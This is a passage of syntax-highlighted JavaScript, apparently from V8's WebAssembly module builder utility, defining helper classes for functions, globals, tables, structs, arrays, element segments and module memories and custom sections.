        <span class="token function">numLocalNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">let</span> num_local_names <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> loc_name <span class="token keyword">of</span> <span class="token keyword">this</span><span class="token punctuation">.</span>local_names<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> loc_name <span class="token operator">==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token operator">++</span>num_local_names<span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">return</span> num_local_names<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">exportAs</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>module<span class="token punctuation">.</span><span class="token function">addExport</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">exportAs</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">setCompilationHint</span><span class="token punctuation">(</span><span class="token parameter">strategy<span class="token punctuation">,</span> baselineTier<span class="token punctuation">,</span> topTier</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>module<span class="token punctuation">.</span><span class="token function">setCompilationHint</span><span class="token punctuation">(</span>
            strategy<span class="token punctuation">,</span>
            baselineTier<span class="token punctuation">,</span>
            topTier<span class="token punctuation">,</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>index
          <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addBody</span><span class="token punctuation">(</span><span class="token parameter">body</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token function">checkExpr</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token comment">// Store a copy of the body, and automatically add the end opcode.</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>body <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kExprEnd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addBodyWithEnd</span><span class="token punctuation">(</span><span class="token parameter">body</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>body <span class="token operator">=</span> body<span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">getNumLocals</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">let</span> total_locals <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> l <span class="token keyword">of</span> <span class="token keyword">this</span><span class="token punctuation">.</span>locals<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            total_locals <span class="token operator">+=</span> l<span class="token punctuation">.</span>count<span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">return</span> total_locals<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addLocals</span><span class="token punctuation">(</span><span class="token parameter">type<span class="token punctuation">,</span> count<span class="token punctuation">,</span> names</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>locals<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> type<span class="token punctuation">,</span> <span class="token literal-property property">count</span><span class="token operator">:</span> count <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          names <span class="token operator">=</span> names <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>names<span class="token punctuation">.</span>length <span class="token operator">></span> count<span class="token punctuation">)</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"too many locals names given"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>local_names<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">...</span>names<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> names<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>local_names<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>count <span class="token operator">-</span> names<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>module<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">class</span> <span class="token class-name">WasmGlobalBuilder</span> <span class="token punctuation">&#123;</span>
        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> type<span class="token punctuation">,</span> mutable<span class="token punctuation">,</span> init</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>module <span class="token operator">=</span> module<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>mutable <span class="token operator">=</span> mutable<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>init <span class="token operator">=</span> init<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">exportAs</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>
            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalGlobal<span class="token punctuation">,</span>
            <span class="token literal-property property">index</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>index<span class="token punctuation">,</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">checkExpr</span><span class="token punctuation">(</span><span class="token parameter">expr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> b <span class="token keyword">of</span> expr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> b <span class="token operator">!==</span> <span class="token string">"number"</span> <span class="token operator">||</span> <span class="token punctuation">(</span>b <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
              <span class="token string">"invalid body (entries must be 8 bit numbers): "</span> <span class="token operator">+</span> expr
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">class</span> <span class="token class-name">WasmTableBuilder</span> <span class="token punctuation">&#123;</span>
        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> type<span class="token punctuation">,</span> initial_size<span class="token punctuation">,</span> max_size<span class="token punctuation">,</span> init_expr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token comment">// TODO(manoskouk): Add the table index.</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>module <span class="token operator">=</span> module<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>initial_size <span class="token operator">=</span> initial_size<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>has_max <span class="token operator">=</span> max_size <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>max_size <span class="token operator">=</span> max_size<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>init_expr <span class="token operator">=</span> init_expr<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>has_init <span class="token operator">=</span> init_expr <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">exportAs</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>
            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalTable<span class="token punctuation">,</span>
            <span class="token literal-property property">index</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>index<span class="token punctuation">,</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">makeField</span><span class="token punctuation">(</span><span class="token parameter">type<span class="token punctuation">,</span> mutability</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> mutability <span class="token operator">!=</span> <span class="token string">"boolean"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"field mutability must be boolean"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> type<span class="token punctuation">,</span> <span class="token literal-property property">mutability</span><span class="token operator">:</span> mutability <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">class</span> <span class="token class-name">WasmStruct</span> <span class="token punctuation">&#123;</span>
        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">fields<span class="token punctuation">,</span> is_final<span class="token punctuation">,</span> supertype_idx</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>fields<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"struct fields must be an array"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>fields <span class="token operator">=</span> fields<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>type_form <span class="token operator">=</span> kWasmStructTypeForm<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>is_final <span class="token operator">=</span> is_final<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>supertype <span class="token operator">=</span> supertype_idx<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">class</span> <span class="token class-name">WasmArray</span> <span class="token punctuation">&#123;</span>
        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">type<span class="token punctuation">,</span> mutability<span class="token punctuation">,</span> is_final<span class="token punctuation">,</span> supertype_idx</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>mutability <span class="token operator">=</span> mutability<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>type_form <span class="token operator">=</span> kWasmArrayTypeForm<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>is_final <span class="token operator">=</span> is_final<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>supertype <span class="token operator">=</span> supertype_idx<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">class</span> <span class="token class-name">WasmElemSegment</span> <span class="token punctuation">&#123;</span>
        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">table<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> type<span class="token punctuation">,</span> elements<span class="token punctuation">,</span> is_decl</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>table <span class="token operator">=</span> table<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>offset <span class="token operator">=</span> offset<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>elements <span class="token operator">=</span> elements<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>is_decl <span class="token operator">=</span> is_decl<span class="token punctuation">;</span>
          <span class="token comment">// Invariant checks.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>table <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>offset <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"invalid element segment"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> elem <span class="token keyword">of</span> elements<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> elem <span class="token operator">==</span> <span class="token string">"number"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>type <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"invalid element"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">is_active</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>table <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">is_passive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>table <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>is_decl<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">is_declarative</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>table <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>is_decl<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">expressions_as_elements</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">class</span> <span class="token class-name">WasmModuleBuilder</span> <span class="token punctuation">&#123;</span>
        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>types <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>imports <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>stringrefs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>globals <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>tables <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>tags <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>memories <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>functions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>compilation_hints <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>element_segments <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>data_segments <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>explicit <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>rec_groups <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_funcs <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_globals <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_tables <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_tags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addStart</span><span class="token punctuation">(</span><span class="token parameter">start_index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>start_index <span class="token operator">=</span> start_index<span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addMemory</span><span class="token punctuation">(</span><span class="token parameter">min<span class="token punctuation">,</span> max<span class="token punctuation">,</span> shared</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token comment">// Note: All imported memories are added before declared ones (see the check</span>
          <span class="token comment">// in &#123;addImportedMemory&#125;).</span>
          <span class="token keyword">const</span> imported_memories <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>
            <span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token operator">=></span> i<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalMemory
          <span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
          <span class="token keyword">const</span> mem_index <span class="token operator">=</span> imported_memories <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memories<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>memories<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token literal-property property">min</span><span class="token operator">:</span> min<span class="token punctuation">,</span>
            <span class="token literal-property property">max</span><span class="token operator">:</span> max<span class="token punctuation">,</span>
            <span class="token literal-property property">shared</span><span class="token operator">:</span> shared <span class="token operator">||</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token literal-property property">is_memory64</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> mem_index<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addMemory64</span><span class="token punctuation">(</span><span class="token parameter">min<span class="token punctuation">,</span> max<span class="token punctuation">,</span> shared</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token comment">// Note: All imported memories are added before declared ones (see the check</span>
          <span class="token comment">// in &#123;addImportedMemory&#125;).</span>
          <span class="token keyword">const</span> imported_memories <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>
            <span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token operator">=></span> i<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalMemory
          <span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
          <span class="token keyword">const</span> mem_index <span class="token operator">=</span> imported_memories <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memories<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>memories<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token literal-property property">min</span><span class="token operator">:</span> min<span class="token punctuation">,</span>
            <span class="token literal-property property">max</span><span class="token operator">:</span> max<span class="token punctuation">,</span>
            <span class="token literal-property property">shared</span><span class="token operator">:</span> shared <span class="token operator">||</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token literal-property property">is_memory64</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> mem_index<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addExplicitSection</span><span class="token punctuation">(</span><span class="token parameter">bytes</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>explicit<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">stringToBytes</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Binary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          result<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> name<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            result<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">createCustomSection</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> bytes</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          name <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">stringToBytes</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">var</span> section <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Binary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>length <span class="token operator">+</span> bytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
          section<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
          section<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> section<span class="token punctuation">.</span><span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addCustomSection</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> bytes</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
